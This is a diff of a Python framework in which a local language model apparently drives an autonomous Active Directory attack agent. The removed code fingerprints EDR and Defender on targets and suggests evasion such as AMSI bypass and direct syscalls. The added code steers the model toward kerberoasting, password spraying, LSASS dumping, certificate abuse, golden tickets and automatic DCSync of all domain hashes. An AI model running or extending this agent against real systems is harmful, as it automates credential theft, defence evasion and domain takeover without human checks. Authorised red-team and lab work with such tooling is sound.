-                    SESSION["domain"]  = dom
-                    SESSION["base_dn"] = base_dn
-                    results.append(f"LDAP rootDSE: domain={dom} base_dn={base_dn}")
-                dns = info_.other.get("dnsHostName")
-                if dns:
-                    SESSION["dc_fqdn"] = str(dns[0])
-                    results.append(f"DC FQDN: {dns[0]}")
-            con.unbind()
-    except Exception as e:
-        results.append(f"LDAP rootDSE failed: {e}")
-
-    # nxc SMB
-    try:
-        nxc_out = subprocess.run(["nxc", "smb", dc_ip], capture_output=True, text=True, timeout=8).stdout
-        m_dom = re.search(r'\(domain:([^)]+)\)', nxc_out)
-        m_os  = re.search(r'\(os:([^)]+)\)', nxc_out)
-        if m_dom:
-            SESSION.setdefault("domain", m_dom.group(1).strip())
-            results.append(f"NXC SMB: domain={m_dom.group(1).strip()}")
-        if m_os:
-            results.append(f"NXC SMB: OS={m_os.group(1).strip()}")
-    except Exception as e:
-        results.append(f"NXC SMB failed: {e}")
-
-    # Quick port scan
-    try:
-        _AD_PORTS = "53,88,135,389,445,636,3268,5985,9389"
-        nmap_out = subprocess.run(
-            ["nmap", "-Pn", "-n", "-p", _AD_PORTS, "--open", "--max-retries", "1",
-             "--host-timeout", "8s", dc_ip],
-            capture_output=True, text=True, timeout=12
-        ).stdout
-        open_ports = re.findall(r'(\d+)/tcp\s+open', nmap_out)
-        if open_ports:
-            SESSION.setdefault("agent_intel", {})["open_ports"] = open_ports
-            results.append(f"Open ports: {', '.join(open_ports)}")
-    except Exception:
-        pass
-
-    success_msg = f"Target re-discovery complete for {dc_ip}\n" + "\n".join(results)
-    success_msg += f"\nCurrent session: domain={SESSION.get('domain')} dc_fqdn={SESSION.get('dc_fqdn')}"
-    return success_msg
-
-
-def tool_opsec_check(target_ip: str, domain: str, username: str,
-                     password: str = "", nt_hash: str = "") -> str:
-    """Enumerate EDR/AV/detection capabilities on target for evasion strategy."""
-    password = _real_secret(password)
-    nt_hash  = _real_nt_hash(nt_hash)
-    auth     = _auth_args_nxc(username, password, nt_hash, domain, target_ip)
-    results  = []
-    intel    = SESSION.setdefault("agent_intel", {})
-
-    # ── EDR/AV process check ──────────────────────────────────────────────────
-    edr_cmd = (
-        "powershell -c \""
-        "Get-Process | Where-Object {$_.Name -match "
-        "'crowdstrike|sentinelone|cylance|carbon.black|defender|mde|csfalcon|csagent|"
-        "mssense|mdatp|eset|kaspersky|symantec|mcafee|sophos|bitdefender|sysmon|"
-        "webroot|trend|fireeye|tanium|darktrace'} | "
-        "Select-Object Name,Id | Format-Table -Auto\""
-    )
-    edr_out = _nxc(f"winrm {target_ip} {auth} -x {shell_quote(edr_cmd)}", timeout=20)
-    results.append(f"=== EDR/AV Processes ===\n{edr_out[:800] or '(WinRM not available or no EDR detected)'}")
-
-    # ── Windows Defender status ───────────────────────────────────────────────
-    def_cmd = ("powershell -c \""
-               "$d = Get-MpComputerStatus -EA SilentlyContinue; "
-               "Write-Output ('Defender RealTime: ' + $d.RealTimeProtectionEnabled); "
-               "Write-Output ('Defender CloudProtect: ' + $d.CloudProtectionEnabled); "
-               "Write-Output ('Defender IOAV: ' + $d.IoavProtectionEnabled)\"")
-    def_out = _nxc(f"winrm {target_ip} {auth} -x {shell_quote(def_cmd)}", timeout=15)
-    results.append(f"=== Windows Defender Status ===\n{def_out[:400]}")
-
-    # ── Sysmon check ─────────────────────────────────────────────────────────
-    sysmon_cmd = ("powershell -c \""
-                  "$s = Get-Service -Name Sysmon,Sysmon64 -EA SilentlyContinue; "
-                  "if ($s) { Write-Output ('Sysmon: ' + $s.Status) } else { Write-Output 'Sysmon: NOT INSTALLED' }\"")
-    sysmon_out = _nxc(f"winrm {target_ip} {auth} -x {shell_quote(sysmon_cmd)}", timeout=12)
-    results.append(f"=== Sysmon ===\n{sysmon_out[:200]}")
-
-    # ── MDI Sensor check ─────────────────────────────────────────────────────
-    mdi_cmd = ("powershell -c \""
-               "$m = Get-Service -Name AATPSensorUpdater,AATPSensor -EA SilentlyContinue; "
-               "if ($m) { Write-Output ('MDI Sensor: ' + $m.Status) } else { Write-Output 'MDI: NOT INSTALLED' }\"")
-    mdi_out = _nxc(f"winrm {target_ip} {auth} -x {shell_quote(mdi_cmd)}", timeout=12)
-    results.append(f"=== Microsoft Defender for Identity (MDI) ===\n{mdi_out[:200]}")
-
-    # ── LAPS check ───────────────────────────────────────────────────────────
-    laps_cmd = ("powershell -c \""
-                "$l = Get-Command 'Get-LapsADPassword' -EA SilentlyContinue; "
-                "if ($l) { Write-Output 'LAPS: INSTALLED' } else { Write-Output 'LAPS: not found' }; "
-                "(Get-ItemProperty 'HKLM:\\Software\\Policies\\Microsoft Services\\AdmPwd' "
-                "-Name AdmPwdEnabled -EA SilentlyContinue).AdmPwdEnabled\"")
-    laps_out = _nxc(f"winrm {target_ip} {auth} -x {shell_quote(laps_cmd)}", timeout=12)
-    results.append(f"=== LAPS ===\n{laps_out[:200]}")
-
-    # ── OPSEC recommendations based on findings ───────────────────────────────
-    opsec_notes = []
-    combined = " ".join(results).lower()
-    if any(x in combined for x in ("crowdstrike", "csfalcon", "csagent")):
-        opsec_notes.append("CrowdStrike detected — use direct syscalls (SysWhispers/Hell's Gate), avoid common tool signatures")
-        intel["edr_present"] = "CrowdStrike"
-    if any(x in combined for x in ("sentinelone", "syssense")):
-        opsec_notes.append("SentinelOne detected — use in-memory techniques, avoid disk writes, prefer LOLBins")
-        intel["edr_present"] = "SentinelOne"
-    if "sysmon" in combined and "running" in combined:
-        opsec_notes.append("Sysmon active — avoid CreateRemoteThread, PowerShell runspaces preferred over new processes")
-    if "mdi" in combined and "running" in combined:
-        opsec_notes.append("MDI active — avoid honeypot accounts, DCSync will be alerted, prefer stealthy user enum")
-    if "realtime: true" in combined.replace(" ", ""):
-        opsec_notes.append("Windows Defender active — use AMSI bypass, obfuscation, or in-memory loading")
-    if "laps: installed" in combined or "admpwdenabled" in combined:
-        opsec_notes.append("LAPS active — local admin password is randomised, PTH lateral movement restricted")
-
-    if opsec_notes:
-        results.append(f"=== OPSEC Recommendations ===\n" + "\n".join(f"  [!] {n}" for n in opsec_notes))
-        intel["opsec_notes"] = opsec_notes
-    else:
-        results.append("=== OPSEC Recommendations ===\n  [+] No major EDR detected — standard tooling should work")
-
-    return "\n\n".join(results)[:5000]
-
-
-# ══════════════════════════════════════════════════════════════════════════════
 #  TOOL DISPATCHER
 # ══════════════════════════════════════════════════════════════════════════════
 
@@ -9283,14 +9247,6 @@ TOOL_MAP = {
     "adidns_abuse":             tool_adidns_abuse,
     "pass_the_cert":            tool_pass_the_cert,
     "rodc_attack":              tool_rodc_attack,
-    # ── AdAgent extensions ────────────────────────────────────────────────────
-    "adfs_attack":              tool_adfs_attack,
-    "wsus_attack":              tool_wsus_attack,
-    "local_privesc_chain":      tool_local_privesc_chain,
-    "trust_chain_planner":      tool_trust_chain_planner,
-    "c2_stage":                 tool_c2_stage,
-    "rediscover_target":        tool_rediscover_target,
-    "opsec_check":              tool_opsec_check,
     "agent_complete":           lambda **kw: f"MISSION: {kw.get('status')} — {kw.get('summary')}",
 }
 
@@ -9354,24 +9310,9 @@ def _print_thinking(text: str):
 
 
 def _print_tool_result(name: str, result: str):
-    # Color-code result header: green for success signals, magenta otherwise
-    r_low = result.lower()
-    is_success = any(x in r_low for x in (
-        "[+]", "found", "success", "valid", "pwn3d", "nt hash", "hash:", "ready", "owned"
-    ))
-    hdr_col = AGENT_GREEN if is_success else AGENT_BLUE
-    print(f"\n  {AGENT_PINK}{BOLD}◈ {hdr_col}TOOL RESULT{RST} {AGENT_PINK}[{name}]{RST}")
+    print(f"\n  {AGENT_PINK}{BOLD}◈ {AGENT_BLUE}TOOL RESULT{RST} {AGENT_PINK}[{name}]{RST}")
     for line in result.strip().splitlines()[:25]:
-        # Highlight key result patterns
-        line_low = line.lower()
-        if any(x in line_low for x in ("[+]", "found", "success", "pwn3d", "valid", "nt hash")):
-            print(f"  {AGENT_GREEN}{line}{RST}")
-        elif any(x in line_low for x in ("[-]", "error", "fail", "denied", "blocked")):
-            print(f"  {AGENT_PINK}{line}{RST}")
-        elif any(x in line_low for x in ("[!]", "warning", "skipped", "timeout")):
-            print(f"  {AGENT_WARN}{line}{RST}")
-        else:
-            print(f"  {AGENT_TEXT}{line}{RST}")
+        print(f"  {AGENT_TEXT}{line}{RST}")
     if result.count("\n") > 25:
         print(f"  {AGENT_PINK}[...{result.count(chr(10))-25} more lines truncated]{RST}")
 
@@ -9540,11 +9481,179 @@ def _ollama_candidate_tools(completed_tools: list,
     return candidates
 
 
+def _ollama_candidate_reason(name: str) -> str:
+    """Evidence-based one-line reason for why a candidate matters RIGHT NOW,
+    derived from live session intel. Gives a small local model the 'why' so it
+    can pick by impact instead of guessing. Target-agnostic: reads only state."""
+    intel = _agent_intel()
+    loot  = SESSION.get("loot", {}) or {}
+    def _n(key):
+        v = intel.get(key)
+        return len(v) if isinstance(v, (list, dict)) else 0
+    def _first(key):
+        v = intel.get(key)
+        return str(v[0])[:40] if isinstance(v, list) and v else ""
+    reasons = {
+        # ── Recon / enumeration ──────────────────────────────────────────────
+        "nmap_scan":            "recon not done yet",
+        "enumerate_ldap":       "AD not enumerated yet",
+        "enumerate_shares":     "shares not enumerated yet",
+        "no_cred_surface_recon":"no creds — map the unauthenticated attack surface",
+        "kerbrute_enum":        "enumerate/validate domain usernames",
+        "user_hunt":            "hunt logged-on users / privileged sessions",
+        "collect_bloodhound":   "collect the AD graph for attack-path analysis",
+        "query_bloodhound_paths":"query BloodHound for the shortest path to DA",
+        "chain_planner":        "build a ranked multi-step attack plan",
+        # ── Credential discovery / cracking ──────────────────────────────────
+        "auto_loot_chain":      (f"{_n('readable_shares')} readable share(s) — hunt creds"
+                                 if intel.get("readable_shares") else "mine shares for credentials"),
+        "credential_loot":      "have a shell — hunt files/registry for secrets",
+        "laps_read":            "LAPS may be readable — local admin password",
+        "test_credential":      "validate a discovered credential before using it",
+        "password_spray":       (f"{_n('users')} users enumerated — spray weak passwords"
+                                 if intel.get("users") else "spray common passwords"),
+        # ── Kerberos ─────────────────────────────────────────────────────────
+        "kerberoast":           (f"{_n('spns')} SPN account(s) found — request & crack TGS"
+                                 if intel.get("spns") else "request service tickets to crack"),
+        "targeted_kerberoast":  "GenericWrite on a user — set an SPN then kerberoast",
+        "asrep_roast":          (f"{_n('asrep_users')} AS-REP roastable user(s)"
+                                 if intel.get("asrep_users") else "find pre-auth-disabled users"),
+        "timeroast":            "MS-SNTP (timeroast) computer-account hash extraction",
+        "request_tgt":          ("NTLM disabled — need a Kerberos TGT"
+                                 if intel.get("ntlm_disabled") else "obtain a Kerberos TGT"),
+        "golden_ticket":        "krbtgt hash obtained — forge a golden ticket",
+        "silver_ticket":        "service-account hash — forge a silver ticket for one service",
+        "pass_the_cert":        "a PFX certificate is available to authenticate (PKINIT/Schannel)",
+        # ── ADCS / certificates ──────────────────────────────────────────────
+        "adcs_scan":            (f"{_n('esc_vulns')} ESC finding(s) to exploit"
+                                 if intel.get("esc_vulns") else "ADCS/CA present — check ESC1–ESC16 misconfig"),
+        # ── ACL / object abuse ───────────────────────────────────────────────
+        "acl_abuse_scan":       (f"{_n('acl_paths')} ACL abuse path(s) found"
+                                 if intel.get("acl_paths") else "look for exploitable AD ACLs"),
+        "bloodyad":             "abuse a writable AD object (generic primitive)",
+        "force_change_password_pivot": "ForceChangePassword right on a target user — reset its password",
+        "shadow_credentials_attack": "GenericWrite/AllExtendedRights — add msDS-KeyCredentialLink (PKINIT)",
+        "rbcd_attack":          "GenericWrite on a COMPUTER object — resource-based constrained delegation",
+        "gmsa_takeover":        (f"writable gMSA: {_first('gmsa_candidates')}"
+                                 if intel.get("gmsa_candidates") else "writable gMSA membership — take it over"),
+        "gmsa_read":            (f"{_n('gmsa_hashes')} gMSA hash(es) readable"
+                                 if intel.get("gmsa_hashes") else "read a gMSA managed password"),
+        "gpo_abuse":            "writable GPO — code execution on all linked OUs/hosts",
+        "logon_script_abuse":   "writable SYSVOL scriptPath — plant a logon script",
+        "adidns_abuse":         "AD-integrated DNS writable — add a record for relay/spoofing",
+        # ── Delegation / trusts / DC ─────────────────────────────────────────
+        "unconstrained_delegation": (f"{_n('delegation')} delegation finding(s) — coerce DC TGT"
+                                 if intel.get("delegation") else "unconstrained delegation host — capture DC TGT"),
+        "trust_attack":         "domain trust found — cross-domain / SID-history escalation",
+        "rodc_attack":          "Read-Only DC — abuse cached creds / Password Replication Policy",
+        # ── Shell / post-exploitation ────────────────────────────────────────
+        "evil_winrm":           ("shell-ready credential available — get a shell"
+                                 if (loot or intel.get("nt_hashes") or intel.get("ccaches")
+                                     or intel.get("adcs_shell_ready")) else "attempt a WinRM shell"),
+        "discover_winrm_access":"find which host this credential can WinRM into",
+        "lateral_movement":     "pivot to another host with current creds",
+        "windows_privesc_recon":"have a shell — local privilege-escalation recon",
+        "jea_enum":             "have a shell — enumerate JEA-constrained endpoints",
+        "credential_dump":      "have a shell — dump LSASS/SAM/LSA secrets",
+        "shadow_copies_dump":   "have a shell — dump NTDS.dit via volume shadow copy",
+        "dcsync_attack":        "replication rights — DCSync all domain hashes (krbtgt+admin)",
+        # ── Service-specific / legacy ────────────────────────────────────────
+        "mssql_abuse":          "MSSQL/1433 reachable — xp_cmdshell / linked-server RCE",
+        "sccm_abuse":           "SCCM/MECM found — NAA creds / client-push relay",
+        "pre2k_attack":         "legacy pre-Windows-2000 computer accounts — predictable passwords",
+        "coercion_attack":      "coerce DC authentication (PetitPotam/printerbug) to capture/relay",
+        # ── Utility ──────────────────────────────────────────────────────────
+        "run_module":           "run a specific framework module directly",
+        "update_session":       "update session state / injected credentials",
+        "generate_report":      "compile findings into the final report",
+        "agent_complete":       "no further high-impact action available",
+    }
+    return reasons.get(name, "next logical step in the kill chain")
+
+
+# Map each agent tool to the SAST knowledge-base category that documents it, so
+# the local model can be grounded in the real AD technique (title + MITRE) for
+# each menu option without loading all 93 techniques into context.
+_TOOL_SAST_CATEGORY = {
+    "adcs_scan": "Cert Abuse", "pass_the_cert": "Cert Abuse",
+    "kerberoast": "Kerberos Attacks", "targeted_kerberoast": "Kerberos Attacks",
+    "asrep_roast": "Kerberos Attacks", "request_tgt": "Kerberos Attacks",
+    "golden_ticket": "Kerberos Attacks", "silver_ticket": "Kerberos Attacks",
+    "timeroast": "Kerberos Attacks",
+    "acl_abuse_scan": "Acl Abuse", "bloodyad": "Acl Abuse",
+    "force_change_password_pivot": "Acl Abuse",
+    "shadow_credentials_attack": "Acl Abuse",
+    "gmsa_takeover": "Acl Abuse", "gmsa_read": "Acl Abuse",
+    "rbcd_attack": "Rbcd Attacks",
+    "gpo_abuse": "Gpo Abuse", "logon_script_abuse": "Gpo Abuse",
+    "coercion_attack": "Coercion Attacks",
+    "credential_dump": "Credential Dump", "credential_loot": "Credential Dump",
+    "shadow_copies_dump": "Credential Dump", "laps_read": "Credential Dump",
+    "dcsync_attack": "Dcsync Dcshadow",
+    "lateral_movement": "Lateral Movement", "evil_winrm": "Lateral Movement",
+    "password_spray": "Password Attacks", "pre2k_attack": "Password Attacks",
+    "trust_attack": "Trust Attacks",
+}
+
+
+# Exact tool → SAST technique-id mapping for precise grounding (preferred over
+# the category/keyword fallback). Tools with no exact technique in the KB
+# (gmsa_takeover, timeroast, …) are intentionally absent and fall back below.
+_TOOL_SAST_TECHNIQUE = {
+    "adcs_scan": "cert-esc1-001", "pass_the_cert": "cert-pkinit-001",
+    "kerberoast": "kerberos-kerberoast-001", "targeted_kerberoast": "kerberos-kerberoast-001",
+    "asrep_roast": "kerberos-asrep-roast-001", "request_tgt": "kerberos-ptt-001",
+    "golden_ticket": "kerberos-golden-ticket-001", "silver_ticket": "kerberos-silver-ticket-001",
+    "unconstrained_delegation": "kerberos-unconstrained-delegation-001",
+    "acl_abuse_scan": "acl-bloodhound-001", "bloodyad": "acl-group-addmember-001",
+    "force_change_password_pivot": "acl-forcechangepassword-001",
+    "shadow_credentials_attack": "acl-shadow-credentials-001",
+    "rbcd_attack": "rbcd-full-chain-001", "gpo_abuse": "gpo-scheduled-task-001",
+    "coercion_attack": "coerce-coercer-001", "credential_dump": "credump-lsass-001",
+    "laps_read": "credump-laps-001", "dcsync_attack": "dcsync-all-hashes-001",
+    "lateral_movement": "lateral-psexec-001", "evil_winrm": "lateral-evil-winrm-001",
+    "password_spray": "password-spray-001", "kerbrute_enum": "password-kerbrute-enum-001",
+    "trust_attack": "trust-child-parent-001",
+}
+# Flat technique-id → technique index, built once from the loaded knowledge base.
+_SAST_BY_ID = {t["id"]: t for techs in SAST_SKILLS.values() for t in techs}
+
+
+def _sast_hint_for_tool(name: str) -> str:
+    """Condensed SAST technique grounding for a tool: 'Title [MITRE, SEVERITY]'.
+    Prefers an exact tool→technique mapping; otherwise matches the best technique
+    in the tool's category by title keyword, else gives a category-level hint.
+    Empty string if no mapping / knowledge base not loaded."""
+    def _fmt(t: dict) -> str:
+        mitre, sev = t.get("mitre", ""), t.get("severity", "")
+        tag = f" [{mitre}{', ' + sev if sev else ''}]" if (mitre or sev) else ""
+        return f"{t.get('title', '')}{tag}".strip()
+    exact = _SAST_BY_ID.get(_TOOL_SAST_TECHNIQUE.get(name, ""))
+    if exact:
+        return _fmt(exact)
+    cat = _TOOL_SAST_CATEGORY.get(name)
+    techs = SAST_SKILLS.get(cat) if cat else None
+    if not techs:
+        return ""
+    kws = [w for w in name.replace("_", " ").split() if len(w) > 3]
+    best = next((t for t in techs
+                 if any(kw in t.get("title", "").lower() for kw in kws)), None)
+    if not best:
+        return f"{cat} — {len(techs)} techniques in knowledge base"
+    return _fmt(best)
+
+
 def _ollama_candidate_menu(candidates: list[tuple[str, dict]]) -> str:
-    lines = ["NEXT-ACTION MENU (call exactly one listed tool):"]
+    lines = ["NEXT-ACTION MENU — pick the SINGLE highest-impact action:"]
     for idx, (name, args) in enumerate(candidates, start=1):
         command_hint = _command_preview_for_tool(name, args)[0]
-        lines.append(f"  {idx}. {name}  command≈{command_hint}")
+        reason = _ollama_candidate_reason(name)
+        lines.append(f"  {idx}. {name} — {reason}  (command≈{command_hint})")
+        sast = _sast_hint_for_tool(name)
+        if sast:
+            lines.append(f"       ↳ technique: {sast}")
+    lines.append("Decide which option has the highest impact given the evidence above, "
+                 "then call exactly one listed tool.")
     return "\n".join(lines)
 
 
@@ -9636,6 +9745,46 @@ def _parse_json_tool_call(content: str):
     return None
 
 
+def _pfx_cert_domain(pfx_path: str) -> str:
+    """Return the AD domain (lowercase) embedded in a PFX's UPN/SAN, or '' if it
+    cannot be determined. Used to avoid picking up a leftover certificate from a
+    PREVIOUS engagement (different box/domain) when the agent globs *.pfx in the
+    CWD — that would feed pass_the_cert a foreign cert and fail with
+    KDC_ERR_C_PRINCIPAL_UNKNOWN. Target-agnostic: reads the cert, never hardcoded."""
+    try:
+        from cryptography.hazmat.primitives.serialization import pkcs12
+        from cryptography import x509
+        data = Path(pfx_path).read_bytes()
+        cert = None
+        for pw in (None, b""):
+            try:
+                _, cert, _ = pkcs12.load_key_and_certificates(data, pw)
+                break
+            except Exception:
+                cert = None
+        if cert is None:
+            return ""
+        try:
+            san = cert.extensions.get_extension_for_class(x509.SubjectAlternativeName).value
+            for name in san:
+                val = getattr(name, "value", None)
+                blob = bytes(val) if isinstance(val, (bytes, bytearray)) else str(val).encode()
+                m = re.search(rb"@([A-Za-z0-9.\-]+\.[A-Za-z]{2,})", blob)
+                if m:
+                    return m.group(1).decode(errors="ignore").lower()
+        except Exception:
+            pass
+        try:
+            dcs = [a.value for a in cert.subject if a.oid == x509.NameOID.DOMAIN_COMPONENT]
+            if dcs:
+                return ".".join(dcs).lower()
+        except Exception:
+            pass
+        return ""
+    except Exception:
+        return ""
+
+
 def _pick_next_tool(completed_tools: list,
                     exclude: set = None,
                     call_counts: dict = None) -> tuple:
@@ -9656,6 +9805,11 @@ def _pick_next_tool(completed_tools: list,
         return int(call_counts.get(name, 0))
     def _done(name: str) -> bool:
         return name in completed_tools or name in exclude
+    def _enum_attempted() -> bool:
+        return any(name in completed_tools for name in (
+            "enumerate_ldap", "enumerate_shares", "collect_bloodhound",
+            "acl_abuse_scan", "adcs_scan",
+        ))
 
     dc    = SESSION.get("dc_ip", "")
     dom   = SESSION.get("domain", "")
@@ -9680,6 +9834,9 @@ def _pick_next_tool(completed_tools: list,
     creds = {"dc_ip": dc, "domain": dom, "username": u, "password": p, "nt_hash": h}
     krbtgt_hash = _real_nt_hash(SESSION.get("loot", {}).get("krbtgt", "") or
                                 intel.get("krbtgt_hash", ""))
+    _esc_found = bool(intel["esc_vulns"]) or any(
+        "ESC" in str(f.get("name", "")) for f in SESSION.get("findings", [])
+    )
 
     # ── Priority -1: Post-DCSync golden ticket ───────────────────────────────
     if krbtgt_hash and not _done("golden_ticket"):
@@ -9688,9 +9845,24 @@ def _pick_next_tool(completed_tools: list,
     # ── Priority -1b: PassTheCert when PFX available but no NT hash yet ──────
     # Only trigger if certipy auth ccache/hash was NOT already obtained.
     pfx_candidates = list(Path(".").glob("*.pfx"))
-    if pfx_candidates and not _done("pass_the_cert") and not intel.get("ccaches"):
+    # Domain-scope leftover PFX files: a cert from a previous engagement must
+    # not be fed to pass_the_cert for the active target.
+    _dom_l = (dom or "").lower()
+    if pfx_candidates and _dom_l:
+        # Loose PFX files in the repo root may be leftovers from a previous
+        # target. Auto-use only certs that identify the active domain, or an
+        # unparseable cert whose filename matches the current principal.
+        _user_stem = (u or "").split("@")[0].split("\\")[-1].lower()
+        scoped = []
+        for p in pfx_candidates:
+            cert_domain = _pfx_cert_domain(str(p))
+            if cert_domain == _dom_l or (not cert_domain and p.stem.lower() == _user_stem):
+                scoped.append(p)
+        pfx_candidates = scoped
+    if (pfx_candidates and _done("nmap_scan") and _done("enumerate_ldap")
+            and not _done("pass_the_cert") and not intel.get("ccaches")):
         pfx = str(pfx_candidates[0])
-        # Cert owner = full PFX stem (e.g. "c.roberts.pfx" → "c.roberts")
+        # Cert owner = full PFX stem (e.g. "alice.pfx" → "alice")
         cert_owner = pfx_candidates[0].stem or u
         return "pass_the_cert", {**creds, "pfx_file": pfx, "target_user": cert_owner,
                                   "pfx_pass": ""}
@@ -9728,12 +9900,6 @@ def _pick_next_tool(completed_tools: list,
         owned_creds = {"dc_ip": dc, "domain": dom,
                        "username": own_user, "password": own_pass, "nt_hash": own_hash}
 
-        # OPSEC check first — understand what we're dealing with
-        if not _done("opsec_check"):
-            return "opsec_check", {"target_ip": target, **owned_creds}
-        # Full local privesc chain before standard post-ex
-        if not _done("local_privesc_chain"):
-            return "local_privesc_chain", {"target_ip": target, **owned_creds}
         if not _done("windows_privesc_recon"):
             return "windows_privesc_recon", {"target_ip": target, **owned_creds}
         if not _done("credential_dump"):
@@ -9742,6 +9908,11 @@ def _pick_next_tool(completed_tools: list,
             return "credential_loot", {**owned_creds, "dc_ip": target}
         if not _done("jea_enum"):
             return "jea_enum", owned_creds
+        # DCSync when we have a shell on the DC — regardless of is_da flag.
+        # gMSA accounts with replication rights won't appear as DA in whoami /all
+        # but secretsdump -just-dc still works; this ensures we don't stop here.
+        if not _done("dcsync_attack") and (target == dc or not dc):
+            return "dcsync_attack", {**owned_creds}
 
     if owned and not _done("lateral_movement"):
         target = owned[0].get("machine", dc)
@@ -9757,6 +9928,39 @@ def _pick_next_tool(completed_tools: list,
 
     if intel.get("winrm_targets") and not _done("evil_winrm") and u not in winrm_dead_users:
         return "evil_winrm", {**creds, "target_ip": intel["winrm_targets"][0]}
+
+    # ── Priority 0c: ADCS scan early (before WinRM probing) ───────────────────
+    # On ADCS boxes (for example ESC13-style paths) WinRM/lateral paths can fail
+    # until certificate-based privilege is discovered. Run adcs_scan once after
+    # baseline recon+LDAP, while no shell-capable hash is in hand. Gated tightly
+    # so it does not disturb other targets:
+    #   • only AFTER recon+enumeration ran (nmap + ldap) — never pre-empts the
+    #     normal recon→enum→exploit methodology or fires on round 1,
+    #   • only when a Kerberos TGT exists (krb) — keeps request_tgt ahead of it,
+    #   • only once (not _done) — cannot loop.
+    # NOT gated on loot/NT-hash: ADCS ESC (ESC1/ESC13/…) is an independent
+    # escalation surface that must be enumerated even when a (possibly useless,
+    # e.g. UnPAC) hash is already in hand — standard AD methodology.
+    # Fully target-agnostic: adcs_scan is read-only enumeration that is a no-op on
+    # non-ADCS targets, so a box without a CA just continues the normal chain.
+    if (not _done("adcs_scan") and krb
+            and _done("nmap_scan") and _done("enumerate_ldap")):
+        return "adcs_scan", {**creds, "auto_exploit": True}
+
+    # A second ADCS attempt is only justified when the earlier scan ran without
+    # Kerberos, found an ESC path, and did not mint a usable shell-ready ccache.
+    # This preserves the original "retry after TGT" intent without allowing a
+    # late duplicate certipy find/req after a normal Kerberos ADCS run.
+    _cc_valid_now = _ccache_is_valid(cc)
+    if (_done("adcs_scan")
+            and _esc_found
+            and _cc_valid_now
+            and _calls("adcs_scan") < 2
+            and intel.get("last_adcs_needs_retry_after_tgt")
+            and not intel.get("last_adcs_scan_used_kerberos")
+            and not intel.get("adcs_shell_ready")
+            and "adcs_scan" not in exclude):
+        return "adcs_scan", {**creds, "auto_exploit": True}
 
     # ── Priority 1: Have NT hash → try to get shell immediately ──────────────
     # Skip WinRM probing entirely if previous attempts proved this principal
@@ -9798,34 +10002,81 @@ def _pick_next_tool(completed_tools: list,
         return "evil_winrm", {**creds, "nt_hash": "", "password": ""}
 
     valid_creds = [c for c in intel.get("valid_creds", []) if _real_secret(c.get("password", ""))]
+
+    def _cred_marker(c: dict) -> tuple:
+        return (
+            str(c.get("user", "")).split("@")[0].split("\\")[-1].lower(),
+            _real_secret(c.get("password", "")),
+            _real_nt_hash(c.get("nt_hash", "")),
+        )
+
+    tested_cred_markers = {
+        _cred_marker(c) for c in (intel.get("valid_creds_tested", []) or [])
+        if isinstance(c, dict)
+    }
+    validated_creds = [
+        c for c in (intel.get("validated_creds", []) or [])
+        if isinstance(c, dict)
+    ]
+
+    def _validation_for(c: dict) -> dict:
+        mark = _cred_marker(c)
+        for item in validated_creds:
+            if _cred_marker(item) == mark:
+                return item
+        return {}
+
+    pending_valid_creds = [
+        c for c in valid_creds
+        if _cred_marker(c) not in tested_cred_markers
+    ]
+    if pending_valid_creds and _calls("test_credential") < max(3, len(valid_creds) + 1):
+        vc = pending_valid_creds[0]
+        return "test_credential", {
+            "dc_ip": dc, "domain": dom,
+            "username": vc.get("user", ""),
+            "password": vc.get("password", ""),
+            "nt_hash": "",
+        }
+
     machine_creds = [
         c for c in valid_creds
         if str(c.get("user", "")).strip().endswith("$")
     ]
-    if (machine_creds and intel.get("gmsa_candidates")
-            and not gmsa_read_dead and not _done("gmsa_read")):
-        mc = machine_creds[0]
-        return "gmsa_read", {
-            "dc_ip": dc, "domain": dom,
-            "username": mc.get("user", ""),
-            "password": mc.get("password", ""),
-            "nt_hash": "",
-        }
-    if valid_creds and _calls("evil_winrm") < 2:
-        best = valid_creds[0]
+    if machine_creds and intel.get("gmsa_candidates"):
+        tried_gmsa = list(intel.get("gmsa_read_tried_for", []) or [])
+        for mc in machine_creds:
+            mc_user = str(mc.get("user", "")).strip()
+            if not mc_user:
+                continue
+            mc_dead = any(_same_ad_account(mc_user, dead) for dead in gmsa_read_dead_users)
+            mc_tried = any(_same_ad_account(mc_user, seen) for seen in tried_gmsa)
+            if mc_dead or mc_tried:
+                continue
+            return "gmsa_read", {
+                "dc_ip": dc, "domain": dom,
+                "username": mc_user,
+                "password": mc.get("password", ""),
+                "nt_hash": "",
+            }
+    winrm_valid_creds = [
+        c for c in valid_creds
+        if _validation_for(c).get("winrm")
+    ]
+    if winrm_valid_creds and _calls("evil_winrm") < 2:
+        best = winrm_valid_creds[0]
+        validation = _validation_for(best)
         best_user = best.get("user", u)
         if best_user in winrm_dead_users:
             pass  # fall through, don't burn rounds on a dead WinRM principal
         else:
-            if _calls("discover_winrm_access") < 2 and not _done("discover_winrm_access"):
-                tool = "discover_winrm_access"
-            else:
-                tool = "evil_winrm"
-            return tool, {
+            target = (validation.get("winrm") or intel.get("winrm_targets") or [dc])[0]
+            return "evil_winrm", {
                 **creds,
                 "username": best_user,
                 "password": best.get("password", ""),
                 "nt_hash": "",
+                "target_ip": target,
             }
 
     # ── Network unreachable: nothing else can succeed ────────────────────────
@@ -9835,7 +10086,12 @@ def _pick_next_tool(completed_tools: list,
         return "nmap_scan", {"target_ip": dc}
 
     # ── Priority 2: NTLM disabled → get Kerberos ticket ─────────────────────
-    if (ntlm_off or intel["ntlm_disabled"]) and not (krb and _ccache_is_valid(cc)):
+    # Only pivot after at least one credentialed enum/auth tool has actually
+    # tried and produced a Kerberos-required signal. Nmap's NTLM banner alone is
+    # not enough evidence; normal AD flow is nmap -> LDAP enum before TGT.
+    if (_enum_attempted()
+            and (ntlm_off or intel["ntlm_disabled"])
+            and not (krb and _ccache_is_valid(cc))):
         if not _done("request_tgt"):
             return "request_tgt", creds
 
@@ -9869,10 +10125,11 @@ def _pick_next_tool(completed_tools: list,
             return "timeroast", {"dc_ip": dc, "domain": dom}
         if not _done("pre2k_attack"):
             return "pre2k_attack", {"dc_ip": dc, "domain": dom}
-        if not ntlm_off and SESSION.get("attacker_ip") and not _done("coercion_attack"):
+        _listener_ip = _attacker_ip()
+        if not ntlm_off and _listener_ip and not _done("coercion_attack"):
             return "coercion_attack", {
                 "dc_ip": dc, "domain": dom, "username": "",
-                "password": "", "attacker_ip": SESSION.get("attacker_ip", ""),
+                "password": "", "attacker_ip": _listener_ip,
             }
         # If we got creds from the above, re-enter the main loop
         new_u = SESSION.get("username", "")
@@ -9932,16 +10189,12 @@ def _pick_next_tool(completed_tools: list,
 
     # ── Priority 5: Certificate attacks (often path to DA) ───────────────────
